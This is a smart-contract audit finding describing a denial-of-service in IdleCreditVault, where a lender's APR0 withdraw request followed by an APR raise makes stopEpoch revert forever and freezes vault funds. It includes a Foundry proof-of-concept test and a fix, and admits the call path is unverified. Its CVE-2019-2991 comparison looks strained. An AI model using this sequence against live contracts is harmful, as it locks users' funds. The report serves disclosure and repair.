### Title
APR0 withdrawal receipt permanently bricks `stopEpoch` after an honest APR increase - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.prepareStopEpochWithApr0` reverts with `NotAllowed` whenever `apr0TotalPrincipal != 0` and `unscaledApr != 0` [1](#0-0) . An unprivileged KYC-passed lender can create a nonzero `apr0TotalPrincipal` by calling `requestWithdraw` during an APR=0 epoch. If the honest manager later raises the APR (a routine per-epoch operation, as exercised in the test suite), every subsequent `stopEpoch` call reverts before `apr0TotalPrincipal` is cleared at the end of the function [2](#0-1) . Because no other code path decrements `apr0TotalPrincipal` (`_settleApr0` only settles per-user data, and the normal `requestWithdraw` branch never touches it) [3](#0-2) , the epoch state machine is permanently wedged with all pool funds frozen.

### Finding Description
The analog of CVE-2019-2991 (optimizer crash / availability loss) is a poisoned-state DoS in the epoch lifecycle:

1. Pool operates an epoch with `unscaledApr == 0` (APR0 mode is a first-class supported mode; `_requestWithdrawApr0` exists specifically for it [4](#0-3) ).
2. Attacker (any KYC-passed tranche holder) calls `IdleCDOEpochVariant.requestWithdraw`, which calls `IdleCreditVault.requestWithdraw`, which routes to `_requestWithdrawApr0`, setting `apr0Users[attacker].principal = amount` and `apr0TotalPrincipal += amount` [5](#0-4) .
3. Honest manager calls `setAprs` to set a nonzero APR for the next epoch — a normal operational step.
4. `stopEpoch` invokes `prepareStopEpochWithApr0`. The early return at `_principal == 0` is skipped because the attacker's receipt is still pending, and execution hits `if (unscaledApr != 0) revert NotAllowed()` [6](#0-5) .
5. `apr0TotalPrincipal = 0` at line 540 is unreachable while APR is nonzero, and no external function can zero it or force-settle the APR0 bucket. The epoch can never be stopped, `epochEndDate` stays in the past, deposits/withdrawals are gated by `isEpochRunning`, and `claimWithdrawRequest` reverts via the `epochNumber <= lastWithdrawRequest` check for the attacker and all other pending receipts [7](#0-6) .

Existing guards do not stop this: the attacker needs no privileged role (only `isWalletAllowed`/KYC), the APR change is performed by the honest manager as designed, and the revert is unconditional rather than validated against a recoverable path.

### Impact Explanation
Permanent freezing of all vault funds (or, if `_emergencyShutdown`/`restoreOperations` can recover borrower funds, a temporary freeze plus forced loss realization). Quantified loss: 100% of `getContractValue()` plus the attacker's own APR0 receipt is locked; every pending withdraw request in `withdrawsRequestsByEpoch` becomes unclaimable because `epochNumber` never increments. This maps to the CVE's "complete DOS of the server plus unauthorized data modification": the attacker unilaterally converts a supported configuration transition (APR0 → APR>0) into an irrecoverable halt.

### Likelihood Explanation
High relative to the required trust assumptions. The attacker only needs to be a KYC-passed lender in an APR0 pool and submit one `requestWithdraw`. The trigger condition — an APR raise while APR0 receipts are pending — is a routine manager action, not an exotic sequence. There is no timeout, escape hatch, or admin function that clears `apr0TotalPrincipal` once `unscaledApr != 0`.

Uncertainty: I could not verify the exact `stopEpoch` call site in `IdleCDOEpochVariant.sol` to confirm `prepareStopEpochWithApr0` is invoked unconditionally (the grep returned match counts without line content). If it is only called when `unscaledApr == 0`, the bricking would not occur and this finding would be invalid. A confirming PoC must assert that `stopEpoch` reverts in step 4.

### Recommendation
In `prepareStopEpochWithApr0`, do not revert on `unscaledApr != 0`. Instead, when APR has been raised, settle the open APR0 bucket at zero interest (or at the rate stored for the request epoch): move `apr0TotalPrincipal` into `pendingWithdraws` at par and zero the bucket before returning, so the epoch can always be stopped. Alternatively, block `setAprs` from leaving APR0 mode while `apr0TotalPrincipal != 0`, reverting at `setAprs` time rather than inside the epoch-critical path.

### Proof of Concept
Foundry fork PoC outline (based on `test/foundry/IdleCreditVault.t.sol` helpers `_startEpochAndCheckPrices` / `_stopEpochAndCheckPrices` / `_forceLastEpochAprToZero`):

```solidity
function testApr0RequestBricksStopEpochAfterAprRaise() external {
    IdleCreditVault _strategy = IdleCreditVault(address(strategy));
    // APR0 mode
    vm.prank(manager);
    _strategy.setAprs(0, 0);
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);

    // attacker: KYC-passed lender deposits and starts epoch at APR 0
    uint256 tranche = idleCDO.depositAA(10_000 * ONE_SCALE);
    _depositWithUser(makeAddr("victim"), 10_000 * ONE_SCALE, true);
    _transferBurnedTrancheTokens(address(this), true);
    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    cdoEpoch.stopEpoch(0, 0);            // epoch ends fine (apr0 bucket empty)

    _forceLastEpochAprToZero();
    // attacker opens an APR0 withdraw request -> apr0TotalPrincipal > 0
    cdoEpoch.requestWithdraw(tranche / 2, address(AAtranche));
    assertGt(_strategy.apr0TotalPrincipal(), 0);

    // honest manager raises APR for next epoch
    vm.prank(manager);
    _strategy.setAprs(initialProvidedApr, initialApr);

    // start next epoch and try to stop it -> reverts forever
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.prank(manager);
    vm.expectRevert(NotAllowed.selector);
    cdoEpoch.stopEpoch(0, 0);
    // repeat: still reverts; victim's funds and all pending receipts frozen
    vm.prank(manager);
    vm.expectRevert(NotAllowed.selector);
    cdoEpoch.stopEpoch(0, 0);
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L285-286)
```text
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-328)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L499-508)
```text
    uint256 _principal = apr0TotalPrincipal;

    // Fast path: no APR0 accounting needed.
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L539-541)
```text
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L545-577)
```text
  function _settleApr0(address _user) internal {
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 _principal = _apr0User.principal;
    if (_principal == 0) {
      return;
    }
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
    // Move principal from "open APR0 bucket" to "settled bucket" (same principal, not duplicated).
    _apr0User.settledPrincipal += _principal;
    uint256 _rate = apr0RateByEpoch[_reqEpoch];
    if (_rate != 0) {
      // Convert per-epoch rate to claimable underlying interest.
      _apr0User.settledInterest += (_principal * _rate) / 1e18;
    }
    _apr0User.principal = 0;
    _apr0User.principalEpoch = 0;
  }

  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```
